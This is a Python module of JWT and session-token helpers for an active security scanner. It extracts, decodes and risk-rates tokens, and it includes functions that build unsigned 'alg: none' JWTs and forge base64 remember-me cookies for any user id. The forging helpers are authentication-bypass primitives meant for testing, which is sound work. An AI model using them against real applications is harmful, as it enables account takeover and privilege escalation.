"""JWT and session-token helpers used by active scanners.

Includes JWT decode/risk analysis, unsigned token construction, and opaque
remember-me token forging. Signatures are never verified — the intent is
structure inspection and exploitation-capability testing.
"""

from __future__ import annotations

import base64
import json
import re
import time
from datetime import datetime, timezone
from typing import Any, Dict, Iterable, List, Optional


JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")


def extract_jwts(*texts: str) -> List[str]:
    seen = set()
    out: List[str] = []
    for text in texts:
        for token in JWT_RE.findall(text or ""):
            if token not in seen:
                seen.add(token)
                out.append(token)
    return out


def decode_jwt(token: str) -> Optional[Dict[str, Any]]:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]).decode("utf-8", "replace"))
        payload = json.loads(_b64url_decode(parts[1]).decode("utf-8", "replace"))
    except (ValueError, json.JSONDecodeError):
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return {"header": header, "payload": payload, "signature": parts[2]}


def jwt_risks(decoded: Dict[str, Any]) -> List[str]:
    header = decoded.get("header") or {}
    payload = decoded.get("payload") or {}
    risks: List[str] = []
    alg = str(header.get("alg") or "").lower()
    if alg in {"none", ""}:
        risks.append("JWT uses no/empty alg")
    if "exp" not in payload:
        risks.append("JWT has no exp claim")
    else:
        try:
            exp = int(payload["exp"])
            if exp - int(time.time()) > 60 * 60 * 24 * 30:
                risks.append("JWT expiration is more than 30 days away")
        except (TypeError, ValueError):
            risks.append("JWT exp claim is not numeric")
    for key in ("role", "roles", "admin", "isAdmin", "permissions"):
        if key in payload:
            risks.append(f"JWT exposes authorization claim: {key}")
    if any(key in payload for key in ("email", "user", "id", "sub")):
        risks.append("JWT exposes user identity claims")
    return risks


def summarize_claims(decoded: Dict[str, Any]) -> str:
    header = decoded.get("header") or {}
    payload = decoded.get("payload") or {}
    return (
        f"alg={header.get('alg')}; typ={header.get('typ')}; "
        f"claims={', '.join(sorted(str(k) for k in payload.keys())[:20])}"
    )


def _b64url_decode(value: str) -> bytes:
    padded = value + "=" * (-len(value) % 4)
    return base64.urlsafe_b64decode(padded.encode("ascii"))


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")


def build_alg_none_jwt(payload: dict) -> str:
    """Unsigned JWT declaring ``alg: none`` (third segment empty, trailing dot)."""
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":"), sort_keys=True).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":"), sort_keys=True).encode())
    return f"{h}.{p}."


def forge_legacy_pipe_remember_v1(user_id: int, username: str, issued_at: Optional[str] = None) -> str:
    """Forge a base64-encoded opaque remember-me token in the v1|id|username|iso8601 format.

    Common in Node-based lab applications that store identity in a reversible cookie.
    """
    if user_id <= 0 or not username:
        raise ValueError("remember token requires positive user_id and non-empty username")
    ts = issued_at or datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
    raw = f"v1|{int(user_id)}|{username}|{ts}".encode("utf-8")
    return base64.b64encode(raw).decode("ascii")
